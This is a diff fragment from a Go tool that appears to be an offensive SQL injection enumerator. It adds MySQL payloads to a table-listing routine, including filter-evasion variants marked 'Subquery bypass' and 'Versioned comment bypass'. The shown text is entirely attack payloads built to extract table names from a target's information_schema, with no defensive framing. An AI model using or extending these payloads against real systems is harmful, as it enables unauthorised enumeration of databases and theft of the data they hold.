@@ -284,6 +284,9 @@ func (en *Enumerator) ListTables(db string, vulnParam string, dbms string) ([]st
 		payloads := []string{
 			// Error-based (MySQL)
 			"' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema='%s' LIMIT %d,1), 0x7e, FLOOR(RAND(0)*2))x FROM information_schema.plugins GROUP BY x)a)-- -",
+			"' AND (SELECT 1 FROM (SELECT table_name FROM information_schema.tables WHERE table_schema='%s' LIMIT %d,1)a)-- -", // Subquery bypass
+			" AND (SELECT 1 FROM (SELECT table_name FROM information_schema.tables WHERE table_schema='%s' LIMIT %d,1)a)-- -",
+			"/*!50000AND (SELECT 1 FROM (SELECT table_name FROM information_schema.tables WHERE table_schema='%s' LIMIT %d,1)a)*/-- -", // Versioned comment bypass
 			// Union-based (Variations 1-6 columns)
 			"' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='%s' LIMIT %d,1-- -",
 			"' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema='%s' LIMIT %d,1-- -",
